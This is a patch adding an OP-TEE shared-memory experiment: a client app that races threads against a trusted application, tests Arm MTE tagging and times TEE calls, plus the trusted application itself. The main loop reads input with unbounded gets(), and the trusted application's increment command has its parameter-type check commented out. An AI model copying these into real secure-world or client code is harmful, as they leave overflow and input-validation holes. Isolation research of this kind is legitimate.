++		errx(1, "TEEC_RegisterSharedMemory failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	printf("Registered shared memory: (%p)[%u]\n", shared_mem.buffer, shared_mem.size);
++
++	// The buffer should not be read only after registering
++	// buf[0] = 52;
++	
++	// ((uint8_t *)shared_mem.buffer)[0] = 42;
++
++	/*
++	 * Open a session to the "shared_mem" TA, the TA will print "hello
++	 * shared mem!" in the log when the session is created.
++	 */
++	printf("Call TEEC_OpenSession\n");
++	res = TEEC_OpenSession(&ctx, &sess, &uuid,
++												 TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++
++	/*
++	 * Execute a function in the TA by invoking it, in this case
++	 * we're incrementing a number.
++	 *
++	 * The value of command ID part and how the parameters are
++	 * interpreted is part of the interface provided by the TA.
++	 */
++
++	/* Clear the TEEC_Operation struct */
++	memset(&op, 0, sizeof(op));
++
++	/*
++	 * Prepare the argument. Pass a value in the first parameter,
++	 * the remaining three parameters are unused.
++	 */
++	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE,
++																	 TEEC_NONE, TEEC_NONE);
++	op.params[0].memref.parent = &shared_mem;
++
++	pthread_create(&threads[0], NULL, (void *)parallel_invoke_command, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	// wait for the TA command invocation
++	msleep(100);
++
++	// we should finish with a segmentation fault if luck is on our side
++	// since the thread[1] is trying to write to a inaccessible memory
++	pthread_create(&threads[1], NULL, (void *)parallel_increment_ca, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	pthread_join(threads[0], NULL);
++	pthread_join(threads[1], NULL);
++
++	TEEC_ReleaseSharedMemory(&shared_mem);
++
++	/*
++	 * We're done with the TA, close the session and
++	 * destroy the context.
++	 *
++	 * The TA will print "Goodbye!" in the log when the
++	 * session is closed.
++	 */
++
++	printf("Call TEEC_CloseSession\n");
++	TEEC_CloseSession(&sess);
++
++	printf("Call TEEC_FinalizeContext\n");
++	TEEC_FinalizeContext(&ctx);
++}
++
++void test_tmpref_piece() {
++	uint8_t *buf;
++	int size;
++	int fd;
++	int ret;
++
++	TEEC_Result res;
++	TEEC_Context ctx;
++	TEEC_Session sess;
++	TEEC_Operation op;
++	TEEC_UUID uuid = TA_SHARED_MEM_UUID;
++	uint32_t err_origin;
++
++	size = 20;
++
++	// printf("Call mmap to allocate a page\n");
++	// fd = open("/dev/zero", O_RDONLY);
++	// buf = (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
++	// close(fd);
++
++	printf("Call malloc to allocate buffer\n");
++	buf = (uint8_t *)malloc(size);
++
++	memset(buf, 0, size);
++
++	printf("Allocated buffer: (%p)[%u]\n", buf, size);
++
++	printf("Call TEEC_InitializeContext\n");
++	/* Initialize a context connecting us to the TEE */
++	res = TEEC_InitializeContext(NULL, &ctx);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++	/*
++	 * Open a session to the "shared_mem" TA, the TA will print "hello
++	 * shared mem!" in the log when the session is created.
++	 */
++	printf("Call TEEC_OpenSession\n");
++	res = TEEC_OpenSession(&ctx, &sess, &uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x", res, err_origin);
++
++	/*
++	 * Execute a function in the TA by invoking it, in this case
++	 * we're incrementing a number.
++	 *
++	 * The value of command ID part and how the parameters are
++	 * interpreted is part of the interface provided by the TA.
++	 */
++
++	/* Clear the TEEC_Operation struct */
++	memset(&op, 0, sizeof(op));
++
++	/*
++	 * Prepare the argument. Pass a value in the first parameter,
++	 * the remaining three parameters are unused.
++	 */
++	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
++	op.params[0].tmpref.buffer = buf;
++	op.params[0].tmpref.size = size;
++	buf[0] = 42;
++
++	/*
++	 * TA_SHARED_MEM_CMD_INC_VALUE is the actual function in the TA to be
++	 * called.
++	 */
++
++	TEEC_SharedMemory shared_mem = {
++		.buffer = buf,
++		.size = size,
++		.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT
++	};
++	pthread_create(&threads[0], NULL, (void *)parallel_invoke_command, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	// wait for the TA command invocation
++	msleep(100);
++
++	// we should finish with a segmentation fault if luck is on our side
++	// since the thread[1] is trying to write to a inaccessible memory
++	pthread_create(&threads[1], NULL, (void *)parallel_increment_ca, (void *)(&(thread_args_t){&op, &sess, &shared_mem, &err_origin, 0}));
++
++	pthread_join(threads[0], NULL);
++	pthread_join(threads[1], NULL);
++
++	printf("Call TEEC_CloseSession\n");
++	TEEC_CloseSession(&sess);
++
++	printf("Call TEEC_FinalizeContext\n");
++	TEEC_FinalizeContext(&ctx);
++}
++
++void test_mte()
++{
++	unsigned char *a;
++	unsigned long page_sz = sysconf(_SC_PAGESIZE) * 2;
++	// unsigned long hwcap2 = getauxval(AT_HWCAP2);
++
++	// /* check if MTE is present */
++	// if (!(hwcap2 & HWCAP2_MTE))
++	// 	return EXIT_FAILURE;
++
++	/*
++	 * Enable the tagged address ABI, synchronous or asynchronous MTE
++	 * tag check faults (based on per-CPU preference) and allow all
++	 * non-zero tags in the randomly generated set.
++	 */
++	if (prctl(PR_SET_TAGGED_ADDR_CTRL,
++						PR_TAGGED_ADDR_ENABLE | PR_MTE_TCF_SYNC | PR_MTE_TCF_ASYNC |
++								(0xfffe << PR_MTE_TAG_SHIFT),
++						0, 0, 0))
++	{
++		perror("prctl() failed");
++		return EXIT_FAILURE;
++	}
++
++	// a = mmap(0, page_sz, PROT_READ | PROT_WRITE,
++	// 				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
++	// if (a == MAP_FAILED)
++	// {
++	// 	perror("mmap() failed");
++	// 	return EXIT_FAILURE;
++	// }
++
++	a = (unsigned char *)malloc(page_sz);
++
++	uint64_t addr = rounddown((uint64_t)a);
++	uint64_t size = roundup((uint64_t)a + page_sz) - addr;
++
++	/*
++	 * Enable MTE on the above anonymous mmap. The flag could be passed
++	 * directly to mmap() and skip this step.
++	 */
++	// if (mprotect(a, page_sz, PROT_READ | PROT_WRITE | PROT_MTE))
++	if (mprotect(addr, size, PROT_READ | PROT_WRITE | PROT_MTE))
++	{
++		perror("mprotect() failed");
++		return EXIT_FAILURE;
++	}
++
++	/* access with the default tag (0) */
++	a[0] = 1;
++	a[1] = 2;
++
++	printf("a[0] = %hhu a[1] = %hhu\n", a[0], a[1]);
++
++	/* set the logical and allocation tags */
++	a = (unsigned char *)insert_random_tag(a);
++	set_tag(a);
++
++	printf("buffer: %p (%lu)\n", a, page_sz);
++
++	/* non-zero tag access */
++	a[0] = 3;
++	printf("a[0] = %hhu a[1] = %hhu\n", a[0], a[1]);
++
++	/*
++	 * If MTE is enabled correctly the next instruction will generate an
++	 * exception.
++	 */
++	printf("Expecting SIGSEGV...\n");
++	a[16] = 0xdd;
++
++	/* this should not be printed in the PR_MTE_TCF_SYNC mode */
++	printf("...haven't got one\n");
++
++	return EXIT_FAILURE;
++}
++
++void test_performance() {
++	uint8_t *buf;
++	int size;
++	int fd;
++	int ret;
++	struct timeval start, end;
++	unsigned long us_cost;
++
++	TEEC_Result res;
++	TEEC_Context ctx;
++	TEEC_Session sess;
++	TEEC_Operation op;
++	TEEC_SharedMemory shared_mem_alloc, shared_mem_reg;
++	TEEC_UUID uuid = TA_SHARED_MEM_UUID;
++	uint32_t err_origin;
++
++	size = getpagesize();
++
++	// printf("Call malloc to allocate buffer\n");
++	// buf = (uint8_t *)malloc(size);
++	// memset(buf, 0, size);
++
++	printf("Call mmap to allocate a page of buffer\n");
++	buf = mmap(0, size, PROT_READ | PROT_WRITE,
++					 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
++	if (buf == MAP_FAILED) {
++		perror("mmap() failed");
++		return EXIT_FAILURE;
++	}
++
++	/* Initialize a context connecting us to the TEE */
++	printf("Call TEEC_InitializeContext\n");
++	gettimeofday(&start, NULL);
++	res = TEEC_InitializeContext(NULL, &ctx);
++	gettimeofday(&end, NULL);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_InitializeContext done: %lu\n", us_cost);
++
++	/* Use TEE Client API to allocate the underlying memory buffer. */
++	printf("Call TEEC_AllocateSharedMemory\n");
++	shared_mem_alloc.size = size;
++	shared_mem_alloc.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
++	gettimeofday(&start, NULL);
++	res = TEEC_AllocateSharedMemory(&ctx, &shared_mem_alloc);
++	gettimeofday(&end, NULL);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_AllocateSharedMemory failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_AllocateSharedMemory done: %lu\n", us_cost);
++	printf("Allocated shared memory: (%p)[%u]\n", shared_mem_alloc.buffer, shared_mem_alloc.size);
++
++	/* Use TEE Client API to register the underlying memory buffer. */
++	printf("Call TEEC_RegisterSharedMemory\n");
++	shared_mem_reg.buffer = buf;
++	shared_mem_reg.size = size;
++	shared_mem_reg.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
++	gettimeofday(&start, NULL);
++	res = TEEC_RegisterSharedMemory(&ctx, &shared_mem_reg);
++	gettimeofday(&end, NULL);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_RegisterSharedMemory failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_RegisterSharedMemory done: %lu\n", us_cost);
++	printf("Registered shared memory: (%p)[%u]\n", shared_mem_reg.buffer, shared_mem_reg.size);
++
++	/*
++	 * Open a session to the "shared_mem" TA, the TA will print "hello
++	 * shared mem!" in the log when the session is created.
++	 */
++	printf("Call TEEC_OpenSession\n");
++	gettimeofday(&start, NULL);
++	res = TEEC_OpenSession(&ctx, &sess, &uuid,
++												 TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++	gettimeofday(&end, NULL);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_OpenSession done: %lu\n", us_cost);
++
++	/*
++	 * Execute a function in the TA by invoking it, in this case
++	 * we're incrementing a number.
++	 *
++	 * The value of command ID part and how the parameters are
++	 * interpreted is part of the interface provided by the TA.
++	 */
++
++	/* Clear the TEEC_Operation struct */
++	memset(&op, 0, sizeof(op));
++
++	/*
++	 * Prepare the argument. Pass a value in the first parameter,
++	 * the remaining three parameters are unused.
++	 */
++	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE, TEEC_NONE, TEEC_NONE);
++	op.params[0].memref.parent = &shared_mem_alloc;
++
++	/*
++	* TA_SHARED_MEM_CMD_NOP does nothing.
++	*/
++	printf("Call TEEC_InvokeCommand\n");
++	gettimeofday(&start, NULL);
++	res = TEEC_InvokeCommand(&sess, TA_SHARED_MEM_CMD_NOP, &op,
++													 &err_origin);
++	gettimeofday(&end, NULL);
++	if (res != TEEC_SUCCESS)
++		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x",
++				 res, err_origin);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_InvokeCommand done: %lu\n", us_cost);
++
++	/*
++	 * We're done with the TA, close the session and
++	 * destroy the context.
++	 *
++	 * The TA will print "Goodbye!" in the log when the
++	 * session is closed.
++	 */
++
++	printf("Call TEEC_CloseSession\n");
++	gettimeofday(&start, NULL);
++	TEEC_CloseSession(&sess);
++	gettimeofday(&end, NULL);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_CloseSession done: %lu\n", us_cost);
++
++	printf("Call TEEC_ReleaseSharedMemory Allocated\n");
++	gettimeofday(&start, NULL);
++	TEEC_ReleaseSharedMemory(&shared_mem_alloc);
++	gettimeofday(&end, NULL);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_ReleaseSharedMemory Allocated done: %lu\n", us_cost);
++
++	printf("Call TEEC_ReleaseSharedMemory Registered\n");
++	gettimeofday(&start, NULL);
++	TEEC_ReleaseSharedMemory(&shared_mem_reg);
++	gettimeofday(&end, NULL);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_ReleaseSharedMemory Registered done: %lu\n", us_cost);
++
++	printf("Call TEEC_FinalizeContext\n");
++	gettimeofday(&start, NULL);
++	TEEC_FinalizeContext(&ctx);
++	gettimeofday(&end, NULL);
++	us_cost = calc_us(start, end);
++	printf("Call TEEC_FinalizeContext done: %lu\n", us_cost);
++
++	printf("Call munmap to release buffer\n");
++	munmap(buf, size);
++}
++
++int main(void)
++{
++	char cmd[20];
++
++	int res = prctl(PR_SET_TAGGED_ADDR_CTRL, PR_TAGGED_ADDR_ENABLE | PR_MTE_TCF_SYNC | PR_MTE_TCF_ASYNC | (0xfffe << PR_MTE_TAG_SHIFT), 0, 0, 0);
++	// printf("prctl res: %d\n", res);
++
++	while (1) {
++		printf("\n\n[0] - test mte\n[1] - test tmpref sequential\n[2] - test tmpref parallel\n[3] - test tmpref piece\n[4] - test memref allocation\n[5] - test memref register\n[6] - test performance\n[q] - quit\nwaiting for cmd [0/1/2/3/4/5/6/q]: ");
++		gets(cmd);
++		if (strcmp(cmd, "q") == 0) {
++			break;
++		} else if (strcmp(cmd, "0") == 0) {
++			test_mte();
++		} else if (strcmp(cmd, "1") == 0) {
++			test_tmpref_seq();
++		} else if (strcmp(cmd, "2") == 0) {
++			test_tmpref_par();
++		} else if (strcmp(cmd, "3") == 0) {
++			test_tmpref_piece();
++		} else if (strcmp(cmd, "4") == 0) {
++			test_memref_alloc();
++		} else if (strcmp(cmd, "5") == 0) {
++			test_memref_reg();
++		} else if (strcmp(cmd, "6") == 0) {
++			test_performance();
++		}
++	}
++
++	return 0;
++}
+diff --git a/shared_mem/ta/Android.mk b/shared_mem/ta/Android.mk
+new file mode 100644
+index 0000000..fc7480b
+--- /dev/null
++++ b/shared_mem/ta/Android.mk
+@@ -0,0 +1,4 @@
++LOCAL_PATH := $(call my-dir)
++
++local_module := 985d99f2-ecc4-47c4-bcfe-71397d6abcbf.ta
++include $(BUILD_OPTEE_MK)
+diff --git a/shared_mem/ta/Makefile b/shared_mem/ta/Makefile
+new file mode 100644
+index 0000000..7196587
+--- /dev/null
++++ b/shared_mem/ta/Makefile
+@@ -0,0 +1,13 @@
++CFG_TEE_TA_LOG_LEVEL ?= 4
++CFG_TA_OPTEE_CORE_API_COMPAT_1_1=y
++
++# The UUID for the Trusted Application
++BINARY=985d99f2-ecc4-47c4-bcfe-71397d6abcbf
++
++-include $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk
++
++ifeq ($(wildcard $(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk), )
++clean:
++	@echo 'Note: $$(TA_DEV_KIT_DIR)/mk/ta_dev_kit.mk not found, cannot clean TA'
++	@echo 'Note: TA_DEV_KIT_DIR=$(TA_DEV_KIT_DIR)'
++endif
+diff --git a/shared_mem/ta/include/shared_mem_ta.h b/shared_mem/ta/include/shared_mem_ta.h
+new file mode 100644
+index 0000000..02eb81e
+--- /dev/null
++++ b/shared_mem/ta/include/shared_mem_ta.h
+@@ -0,0 +1,44 @@
++/*
++ * Copyright (c) 2016-2017, Linaro Limited
++ * All rights reserved.
++ *
++ * Redistribution and use in source and binary forms, with or without
++ * modification, are permitted provided that the following conditions are met:
++ *
++ * 1. Redistributions of source code must retain the above copyright notice,
++ * this list of conditions and the following disclaimer.
++ *
++ * 2. Redistributions in binary form must reproduce the above copyright notice,
++ * this list of conditions and the following disclaimer in the documentation
++ * and/or other materials provided with the distribution.
++ *
++ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
++ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
++ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
++ * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
++ * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
++ * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
++ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
++ * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
++ * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
++ * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
++ * POSSIBILITY OF SUCH DAMAGE.
++ */
++#ifndef TA_SHARED_MEM_H
++#define TA_SHARED_MEM_H
++
++
++/*
++ * This UUID is generated with uuidgen
++ * the ITU-T UUID generator at http://www.itu.int/ITU-T/asn1/uuid.html
++ */
++#define TA_SHARED_MEM_UUID \
++	{ 0x985d99f2, 0xecc4, 0x47c4, \
++		{ 0xbc, 0xfe, 0x71, 0x39, 0x7d, 0x6a, 0xbc, 0xbf} }
++
++/* The function IDs implemented in this TA */
++#define TA_SHARED_MEM_CMD_INC_VALUE		0
++#define TA_SHARED_MEM_CMD_DEC_VALUE		1
++#define TA_SHARED_MEM_CMD_NOP					2
++
++#endif /*TA_SHARED_MEM_H*/
+diff --git a/shared_mem/ta/shared_mem_ta.c b/shared_mem/ta/shared_mem_ta.c
+new file mode 100644
+index 0000000..3f5c501
+--- /dev/null
++++ b/shared_mem/ta/shared_mem_ta.c
+@@ -0,0 +1,158 @@
++#include <tee_api.h>
++#include <tee_internal_api.h>
++#include <tee_internal_api_extensions.h>
++
++#include <shared_mem_ta.h>
++
++/*
++ * Called when the instance of the TA is created. This is the first call in
++ * the TA.
++ */
++TEE_Result TA_CreateEntryPoint(void)
++{
++	DMSG("has been called");
++
++	return TEE_SUCCESS;
++}
++
++/*
++ * Called when the instance of the TA is destroyed if the TA has not
++ * crashed or panicked. This is the last call in the TA.
++ */
++void TA_DestroyEntryPoint(void)
++{
++	DMSG("has been called");
++}
++
++/*
++ * Called when a new session is opened to the TA. *sess_ctx can be updated
++ * with a value to be able to identify this session in subsequent calls to the
++ * TA. In this function you will normally do the global initialization for the
++ * TA.
++ */
++TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types,
++																		TEE_Param __maybe_unused params[4],
++																		void __maybe_unused **sess_ctx)
++{
++	uint32_t exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE);
++
++	DMSG("has been called");
++
++	if (param_types != exp_param_types)
++		return TEE_ERROR_BAD_PARAMETERS;
++
++	/* Unused parameters */
++	(void)&params;
++	(void)&sess_ctx;
++
++	/*
++	 * The DMSG() macro is non-standard, TEE Internal API doesn't
++	 * specify any means to logging from a TA.
++	 */
++	IMSG("Hello Shared Mem!\n");
++
++	/* If return value != TEE_SUCCESS the session will not be created. */
++	return TEE_SUCCESS;
++}
++
++/*
++ * Called when a session is closed, sess_ctx hold the value that was
++ * assigned by TA_OpenSessionEntryPoint().
++ */
++void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx)
++{
++	(void)&sess_ctx; /* Unused parameter */
++	IMSG("Goodbye!\n");
++}
++
++static TEE_Result cmd_inc_value(uint32_t param_types, TEE_Param params[4])
++{
++	uint8_t *buf = NULL;
++	uint32_t len = 0;
++
++	uint32_t exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INOUT,
++																						 TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE);
++
++	DMSG("[shared_mem_ta] inc_value has been called");
++
++	// if (param_types != exp_param_types)
++	// 	return TEE_ERROR_BAD_PARAMETERS;
++
++	buf = params[0].memref.buffer;
++	len = params[0].memref.size;
++
++	IMSG("[shared_mem_ta] Got buffer: (%p)[%u] from NW", buf, len);
++	buf[0]++;
++
++	// a delay here, in order to show if the memory is really inaccessible in CA
++	// for (size_t i = 0; i < 1000000; i++)
++	// 	for (size_t j = 0; j < 1000000; j++)
++	// 		for (size_t k = 0; k < 1000000; k++)
++	// 			for (size_t l = 0; l < 1000000; l++);
++	// Wait for 500ms
++	TEE_Wait(500);
++
++	IMSG("[shared_mem_ta] Increase buf[0] to: %u", buf[0]);
++
++	return TEE_SUCCESS;
++}
++
++static TEE_Result cmd_dec_value(uint32_t param_types, TEE_Param params[4])
++{
++	uint8_t *buf = NULL;
++	uint32_t len = 0;
++
++	uint32_t exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INOUT,
++																						 TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE,
++																						 TEE_PARAM_TYPE_NONE);
++
++	DMSG("[shared_mem_ta] dec_value has been called");
++
++	if (param_types != exp_param_types)
++		return TEE_ERROR_BAD_PARAMETERS;
++
++	buf = params[0].memref.buffer;
++	len = params[0].memref.size;
++
++	IMSG("[shared_mem_ta] Got buffer: (%p)[%u] from NW", buf, len);
++	buf[0]--;
++	IMSG("[shared_mem_ta] Increase buf[0] to: %u", buf[0]);
++
++	return TEE_SUCCESS;
++}
++
++static TEE_Result cmd_nop(uint32_t param_types,
++													TEE_Param params[4])
++{
++	return TEE_SUCCESS;
++}
++
++/*
++ * Called when a TA is invoked. sess_ctx hold that value that was
++ * assigned by TA_OpenSessionEntryPoint(). The rest of the paramters
++ * comes from normal world.
++ */
++TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx,
++																			uint32_t cmd_id,
++																			uint32_t param_types, TEE_Param params[4])
++{
++	(void)&sess_ctx; /* Unused parameter */
++
++	switch (cmd_id)
++	{
++	case TA_SHARED_MEM_CMD_INC_VALUE:
++		return cmd_inc_value(param_types, params);
++	case TA_SHARED_MEM_CMD_DEC_VALUE:
++		return cmd_dec_value(param_types, params);
++	case TA_SHARED_MEM_CMD_NOP:
++		return cmd_nop(param_types, params);
++	default:
++		return TEE_ERROR_BAD_PARAMETERS;
++	}
++}
+diff --git a/shared_mem/ta/sub.mk b/shared_mem/ta/sub.mk
+new file mode 100644
+index 0000000..819ced6
+--- /dev/null
++++ b/shared_mem/ta/sub.mk
+@@ -0,0 +1,5 @@
++global-incdirs-y += include
++srcs-y += shared_mem_ta.c
++
++# To remove a certain compiler flag, add a line like this
++#cflags-template_ta.c-y += -Wno-strict-prototypes
+diff --git a/shared_mem/ta/user_ta_header_defines.h b/shared_mem/ta/user_ta_header_defines.h
+new file mode 100644
+index 0000000..18d1583
+--- /dev/null
++++ b/shared_mem/ta/user_ta_header_defines.h
+@@ -0,0 +1,66 @@
++/*
++ * Copyright (c) 2016-2017, Linaro Limited
++ * All rights reserved.
++ *
++ * Redistribution and use in source and binary forms, with or without
++ * modification, are permitted provided that the following conditions are met:
++ *
++ * 1. Redistributions of source code must retain the above copyright notice,
++ * this list of conditions and the following disclaimer.
++ *
++ * 2. Redistributions in binary form must reproduce the above copyright notice,
++ * this list of conditions and the following disclaimer in the documentation
++ * and/or other materials provided with the distribution.
++ *
++ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
++ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
++ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
++ * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
++ * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
++ * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
++ * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
++ * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
++ * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
++ * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
++ * POSSIBILITY OF SUCH DAMAGE.
++ */
++
++/*
++ * The name of this file must not be modified
++ */
++
++#ifndef USER_TA_HEADER_DEFINES_H
++#define USER_TA_HEADER_DEFINES_H
++
++/* To get the TA UUID definition */
++#include <shared_mem_ta.h>
++
++#define TA_UUID				TA_SHARED_MEM_UUID
++
++/*
++ * TA properties: multi-instance TA, no specific attribute
++ * TA_FLAG_EXEC_DDR is meaningless but mandated.
++ */
++#define TA_FLAGS			TA_FLAG_EXEC_DDR
++
++/* Provisioned stack size */
++#define TA_STACK_SIZE			(2 * 1024)
++
++/* Provisioned heap size for TEE_Malloc() and friends */
++#define TA_DATA_SIZE			(32 * 1024)
++
++/* The gpd.ta.version property */
++#define TA_VERSION	"1.0"
++
++/* The gpd.ta.description property */
++#define TA_DESCRIPTION	"Example of OP-TEE Hello World Trusted Application"
++
++/* Extra properties */
++#define TA_CURRENT_TA_EXT_PROPERTIES \
++    { "org.linaro.optee.examples.hello_world.property1", \
++	USER_TA_PROP_TYPE_STRING, \
++        "Some string" }, \
++    { "org.linaro.optee.examples.hello_world.property2", \
++	USER_TA_PROP_TYPE_U32, &(const uint32_t){ 0x0010 } }
++
++#endif /* USER_TA_HEADER_DEFINES_H */
